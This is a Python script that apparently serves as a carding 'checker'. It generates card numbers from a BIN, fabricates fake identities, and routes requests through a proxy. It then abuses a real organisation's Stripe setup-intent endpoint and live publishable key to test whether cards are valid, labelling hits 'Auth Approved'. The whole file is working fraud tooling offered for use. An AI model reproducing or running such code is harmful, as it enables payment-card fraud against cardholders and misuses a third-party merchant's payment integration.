import random
import string
import requests
import random_address



def find_between(data, first, last):
  try:
    start = data.index(first) + len(first)
    end = data.index(last, start)
    return data[start:end]
  except ValueError:
    return None
N = 8
ph = ''.join(random.choices(string.digits, k=N))
phone = "98" + ph

mm = random_address.real_random_address_by_postal_code('32409')

address1 = mm["address1"]
state = mm["state"]


email_length = 9
characters = string.ascii_letters + string.ascii_uppercase
email = ""
for index in range(email_length):
  email = email + random.choice(characters)
first = email
last = first
mail = f"{email}@gmail.com"

def checkLuhn(cardNo):

  nDigits = len(cardNo)
  nSum = 0
  isSecond = False

  for i in range(nDigits - 1, -1, -1):
    d = ord(cardNo[i]) - ord('0')

    if (isSecond == True):
      d = d * 2

    # We add two digits to handle
    # cases that make two digits after
    # doubling
    nSum += d // 10
    nSum += d % 10

    isSecond = not isSecond

  if (nSum % 10 == 0):
    return True
  else:
    return False


def cc_gen(
  cc,
  mes='x',
  ano='x',
  cvv='x',
  amount='x',
):
  if amount != 'x':
    amount = int(amount)
  else:
    amount = 15
  genrated = 0
  ccs = []
  while (genrated < amount):
    genrated += 1
    s = "0123456789"
    l = list(s)
    random.shuffle(l)
    result = ''.join(l)
    result = cc + result
    if cc[0] == "3":
      ccgen = result[0:15]
    else:
      ccgen = result[0:16]
    if mes == 'x':
      mesgen = random.randint(1, 12)
      if len(str(mesgen)) == 1:
        mesgen = "0" + str(mesgen)
    else:
      mesgen = mes
    if ano == 'x':
      anogen = random.randint(2021, 2029)
    else:
      anogen = ano
    if cvv == 'x':
      if cc[0] == "3":
        cvvgen = random.randint(1000, 9999)
      else:
        cvvgen = random.randint(100, 999)
    else:
      cvvgen = cvv
    # if not x: continue
    lista = "<code>" + str(ccgen) + "|" + str(mesgen) + "|" + str(
      anogen) + "|" + str(cvvgen) + "</code>"
    ccs.append(lista)
  return ccs


proxies = {
  'http': 'http://us.proxiware.com:2000',
  'https': 'http://us.proxiware.com:2000'
}


def find_between(data, first, last):
  try:
    start = data.index(first) + len(first)
    end = data.index(last, start)
    return data[start:end]
  except ValueError:
    return None






def new_func2(r,cc,cvv,mes,ano,):
    url1 = "https://www.afscv.org/_public/Components/Commerce/Configuration/PaymentMethods/Methods/CreditCard/Gateways/Stripe/setup_intent.php"
    data1 = """{"payment_method_id":6}"""    
        
    r1 = r.post(url1, data=data1)
    r1j = r1.json()
    try:
        seti = r1j["id"]
        seti_s = r1j["client_secret"]    
    except:
        cm = r1j["error"]["code"]
        return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b>{cm}🚫</b>\n")
        
    url2 = f"https://api.stripe.com/v1/setup_intents/{seti}/confirm"
    data2 = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=+Sam+smith&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=d2f1afe2-277e-40da-8408-5ef25ae9b1a1e88e53&payment_method_data[muid]=f197fbad-91a1-4baf-b100-b4df1f809487c204b3&payment_method_data[sid]=7f5c025b-8e69-4ace-819e-e463863c40bbb0d00e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc8b8c6168%3B+stripe-js-v3%2Fc8b8c6168&payment_method_data[time_on_page]=501203&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51F0EDvB1Ma5SOvilMZe4TNFodNsWG1JYYPHSGiDvRYkKEHFRfxWZx540KUSbS23ypfSNvDJyq06kakMaPw5QGhMX00VdgIt50x&client_secret={seti_s}"
       
    r2 = r.post(url2, data=data2)
    r2j = r2.json()
    
    r2t = r2.text
    try:

      if "succeeded" in r2t:
          return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b>Auth Approved ✅ </b>\n")
      elif "incorrect_number" in r2t:
          Inc = r2j["error"]["code"]
          return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b> {Inc}</b>\n")
      elif "message" in r2t:
          try:
              err = r2j["error"]["decline_code"]
              return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b>{err}</b>\n")
          except:
              kd = r2j["error"]["code"]
              return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b>{kd} </b>\n")

      else:
          return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b>Error Checking</b>\n")
    except:
      return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n <b>Error Checking</b>\n")